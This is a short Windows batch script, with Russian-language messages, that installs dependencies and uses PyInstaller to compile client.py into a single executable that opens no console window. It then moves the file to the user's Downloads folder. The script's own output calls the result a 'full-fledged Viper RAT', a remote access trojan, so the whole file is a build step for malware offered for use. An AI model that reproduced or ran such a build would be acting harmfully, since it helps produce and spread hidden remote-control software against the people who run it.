@echo off
echo [1] Устанавливаю библиотеки...
python -m pip install -r requirements.txt
python -m pip install pyinstaller

echo.
echo [2] Собираю Viper RAT EXE...
python -m PyInstaller --onefile --noconsole client.py

echo.
echo [3] Перемещаю в папку "Загрузки"...
move dist\client.exe %USERPROFILE%\Downloads\client.exe

echo.
echo =========================================
echo ГОТОВО! Файл client.exe лежит в папке "Загрузки".
echo Это ПОЛНОЦЕННЫЙ Viper RAT.
echo =========================================
pause
